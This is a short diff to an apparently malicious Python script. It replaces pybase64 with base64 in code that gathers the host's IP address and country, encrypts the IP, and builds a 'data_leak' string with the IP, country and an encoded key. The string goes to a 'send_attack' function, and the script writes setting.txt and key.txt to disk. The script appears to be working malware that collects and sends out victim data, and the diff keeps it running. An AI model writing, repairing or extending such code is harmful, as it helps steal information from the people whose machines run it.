@@ -1,4 +1,3 @@
-import pybase64
 import requests
 import base64
 import cryptography
@@ -29,9 +28,9 @@ else:
     else:
      FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - DOWNLOAD IP . . .\n')
      xff_xff_x00 = data[0].encode()
-     data_leak = f"IP {pybase64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()} COUNTRY {data[1]}.{data[2]} KEYS {pybase64.b64encode(pybase64.standard_b64encode(key))}"
+     data_leak = f"IP {base64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()} COUNTRY {data[1]}.{data[2]} KEYS {base64.b64encode(base64.standard_b64encode(key))}"
      send_attack(data_leak)
-     FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'W',F'False@{xff_xff_x00.decode()}@{pybase64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()}')
+     FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'W',F'False@{xff_xff_x00.decode()}@{base64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()}')
      FILES_MAKER(os.path.join(os.path.dirname(__file__),'key.txt'),'WB',key)
      FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - WRITE FILES setting.txt & key.txt\n')
      print(f"⚙️ MAKE FILES setting.txt . . .")
